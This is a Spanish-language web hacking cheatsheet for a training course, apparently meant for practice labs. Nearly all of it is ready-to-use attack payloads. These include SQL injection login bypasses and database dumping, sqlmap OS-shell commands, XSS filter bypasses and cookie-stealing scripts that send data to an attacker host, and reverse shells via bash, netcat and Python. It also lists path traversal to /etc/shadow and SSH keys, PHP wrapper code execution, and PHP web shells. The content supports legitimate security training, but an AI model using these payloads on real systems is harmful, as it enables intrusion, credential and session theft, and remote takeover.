# Cheatsheet Web Hacking - Mes 2

## Referencia Rápida para Consultar Durante la Práctica

---

## SQL INJECTION

### Detección
```sql
'
''
`
"
')
")
'-- 
')-- 
```

### Bypass de Login
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
admin'--
admin'#
' OR 1=1--
" OR ""="
```

### Descubrir Columnas
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Extraer Datos (MySQL)
```sql
-- Version
' UNION SELECT version(),2--
' UNION SELECT @@version,2--

-- Usuario actual
' UNION SELECT user(),2--
' UNION SELECT current_user(),2--

-- Base de datos actual
' UNION SELECT database(),2--

-- Listar todas las bases de datos
' UNION SELECT schema_name,2 FROM information_schema.schemata--

-- Listar tablas
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='database_name'--
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--

-- Listar columnas
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='table_name'--

-- Extraer datos
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(username,':',password),2 FROM users--
```

### SQLMap Comandos Rápidos
```bash
# Detección básica
sqlmap -u "http://target/page?id=1"

# Con cookie
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=xxx"

# Listar DBs
sqlmap -u "http://target/page?id=1" --dbs

# Listar tablas
sqlmap -u "http://target/page?id=1" -D dbname --tables

# Listar columnas
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --columns

# Dump datos
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --dump

# Shell OS
sqlmap -u "http://target/page?id=1" --os-shell
```

---

## XSS (Cross-Site Scripting)

### Payloads Básicos
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### Sin Tags Script
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
```

### Bypass de Filtros
```html
<!-- Mayúsculas/minúsculas -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Sin paréntesis -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>

<!-- Codificación HTML -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Doble encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Saltar espacios -->
<img/src=x/onerror=alert(1)>
```

### Robo de Cookies
```html
<script>fetch('http://ATACANTE/?c='+document.cookie)</script>
<script>new Image().src='http://ATACANTE/?c='+document.cookie</script>
<img src=x onerror="this.src='http://ATACANTE/?c='+document.cookie">
```

### En Atributos
```html
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
"><script>alert(1)</script>
'><script>alert(1)</script>
```

---

## COMMAND INJECTION

### Operadores de Concatenación
```bash
# Linux
; comando          # Ejecuta después
| comando          # Pipe
|| comando         # Ejecuta si anterior falla
&& comando         # Ejecuta si anterior éxito
$(comando)         # Substitución
`comando`          # Substitución (backticks)

# Windows
& comando
| comando
|| comando
&& comando
```

### Payloads Útiles
```bash
; whoami
; id
; cat /etc/passwd
; ls -la
; pwd
; uname -a
; netstat -an
| whoami
|| whoami
&& whoami
$(whoami)
`whoami`
```

### Reverse Shell
```bash
; bash -i >& /dev/tcp/IP/PORT 0>&1
; nc -e /bin/bash IP PORT
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## FILE INCLUSION (LFI/RFI)

### Path Traversal Básico
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
```

### Archivos Interesantes (Linux)
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

### Archivos Interesantes (Windows)
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\logs\LogFiles\
C:\inetpub\wwwroot\web.config
```

### Wrappers PHP
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST: <?php system($_GET['cmd']); ?>)
data://text/plain,<?php system($_GET['cmd']); ?>
expect://whoami
```

---

## FILE UPLOAD

### Extensiones PHP
```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
.pht
```

### Bypass de Filtros
```
# Doble extensión
shell.php.jpg
shell.jpg.php

# Null byte (PHP < 5.3.4)
shell.php%00.jpg

# Mayúsculas
shell.PHP
shell.Php

# Caracteres especiales
shell.php.
shell.php;.jpg
shell.php%20

# Content-Type bypass
Cambiar: application/x-php
Por: image/jpeg
```

### Web Shell Simple
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

---

## BURP SUITE

### Atajos Importantes
```
Ctrl+R    → Enviar a Repeater
Ctrl+I    → Enviar a Intruder
Ctrl+U    → URL encode selección
Ctrl+Shift+U → URL decode selección
Ctrl+B    → Base64 encode
Ctrl+Shift+B → Base64 decode
```

### Intruder Attack Types
```
Sniper     → Un payload, una posición a la vez
Battering Ram → Un payload, todas las posiciones
Pitchfork  → Múltiples payloads, sincronizados
Cluster Bomb → Múltiples payloads, todas combinaciones
```

---

## HEADERS HTTP IMPORTANTES

### Headers de Seguridad
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

### Headers Útiles para Ataques
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: http://target.com/admin
```

---

## CÓDIGOS DE ESTADO HTTP

```
200 OK                    → Éxito
201 Created               → Recurso creado
301 Moved Permanently     → Redirección permanente
302 Found                 → Redirección temporal
400 Bad Request           → Petición mal formada
401 Unauthorized          → Necesita autenticación
403 Forbidden             → Acceso denegado
404 Not Found             → No existe
405 Method Not Allowed    → Método no permitido
500 Internal Server Error → Error del servidor
502 Bad Gateway           → Error de proxy
503 Service Unavailable   → Servicio no disponible
```

---

## TOOLS RÁPIDO

### Gobuster
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w wordlist.txt -x php,txt,html
gobuster dir -u http://target -w wordlist.txt -t 50 -o output.txt
```

### Nikto
```bash
nikto -h http://target
nikto -h http://target -o report.html -Format html
```

### WhatWeb
```bash
whatweb http://target
whatweb -a 3 http://target
```

### cURL
```bash
# GET simple
curl http://target

# Con headers
curl -H "Cookie: session=abc" http://target

# POST
curl -X POST -d "user=admin&pass=admin" http://target/login

# Ver headers
curl -I http://target

# Seguir redirects
curl -L http://target

# Guardar cookies
curl -c cookies.txt http://target

# Usar cookies
curl -b cookies.txt http://target
```

---

## ENCODING/DECODING RÁPIDO

### URL Encoding
```
Espacio  → %20 o +
<        → %3C
>        → %3E
"        → %22
'        → %27
/        → %2F
?        → %3F
&        → %26
=        → %3D
#        → %23
```

### HTML Encoding
```
<  → &lt;
>  → &gt;
"  → &quot;
'  → &#39;
&  → &amp;
```

### Base64
```bash
# Encode
echo -n "texto" | base64

# Decode
echo "dGV4dG8=" | base64 -d
```

---

## NOTAS IMPORTANTES

1. **Siempre documenta** lo que encuentras
2. **Prueba en nivel LOW** primero, luego sube dificultad
3. **Usa Burp Suite** para entender las peticiones
4. **Verifica manualmente** los hallazgos de herramientas automáticas
5. **Aprende de los errores** - cada error de SQL revela información

---

*Guarda este archivo para consulta rápida durante tus prácticas*
